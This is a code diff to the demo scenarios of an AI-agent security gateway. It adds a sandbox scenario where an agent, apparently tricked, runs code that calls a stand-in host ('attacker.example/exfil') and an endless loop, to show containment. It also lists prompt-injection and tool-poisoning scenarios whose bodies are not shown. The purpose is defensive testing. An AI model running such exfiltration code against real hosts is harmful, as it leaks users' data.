@@ -9,7 +9,7 @@ import os
 import pickle
 from typing import Any
 
-from mandate.engine import Gateway
+from aegis.engine import Gateway
 
 AGENT = "demo-agent"
 
@@ -25,8 +25,9 @@ class _Run:
         return resp.json()
 
     async def task(self, profile="contract_review", client="A", principal="lawyer_anna"):
+        params = {"client": client} if "{client}" in str(self.gw.policy.active.task_profiles[profile].resources) else {}
         task = await self.gw.tasks.create(self.gw.policy.active, principal=principal, agent_id=AGENT,
-                                          profile=profile, params={"client": client},
+                                          profile=profile, params=params,
                                           purpose=f"demo: {self.title}")
         self.steps.append({"step": "task_created", "task_id": task.id, "mandate": task.mandate})
         return task, self.gw.tasks.lease_for(task)
@@ -41,7 +42,8 @@ class _Run:
                            "rule_id": m.get("rule_id"), "reason_code": m.get("reason_code"),
                            "tool_invoked": m.get("tool_invoked"),
                            "findings": [f"{f['action']} {f['rule_id']}" for f in m.get("findings", [])
-                                        if f["action"] != "ALLOW"]})
+                                        if f["action"] != "ALLOW"],
+                           "sandbox": (body.get("result") or {}).get("sandbox") if isinstance(body.get("result"), dict) else None})
         return status, body
 
     async def chat(self, lease, label, content):
@@ -177,7 +179,7 @@ async def supply_chain(gw: Gateway):
 
 async def budget_race(gw: Gateway):
     """30 agents race for a 10k-token pool (1k max_tokens each). Overspend must be 0."""
-    from mandate.admin import simulate as _sim  # reuse the admin implementation
+    from aegis.admin import simulate as _sim  # reuse the admin implementation
 
     class _Req:
         class app:  # noqa: N801
@@ -188,6 +190,18 @@ async def budget_race(gw: Gateway):
     return {"scenario": "budget race", "steps": [summary], **summary}
 
 
+async def code_sandbox(gw: Gateway):
+    """An agent is tricked into running code that tries to reach the network and to run forever.
+    The code runs in an isolated throw-away container: no network, killed at the limits, host untouched."""
+    r = _Run(gw, "code runs in a sandbox")
+    _task, lease = await r.task(profile="data_task", principal="analyst")
+    await r.tool(lease, "code.run", "harmless calculation", code="print('rows processed:', sum(range(1000)))")
+    await r.tool(lease, "code.run", "code tries to phone home",
+                 code="import urllib.request\nurllib.request.urlopen('http://attacker.example/exfil', timeout=5)")
+    await r.tool(lease, "code.run", "code tries to run forever", code="while True:\n    pass")
+    return r.done(note="each ran in its own --network none, read-only, memory-capped container, then it was removed")
+
+
 SCENARIOS = {
     "clean": clean_task,
     "injection": injection,
@@ -196,5 +210,6 @@ SCENARIOS = {
     "expired_lease": expired_lease,
     "mcp_poison": mcp_poison,
     "supply_chain": supply_chain,
+    "code_sandbox": code_sandbox,
     "budget_race": budget_race,
 }
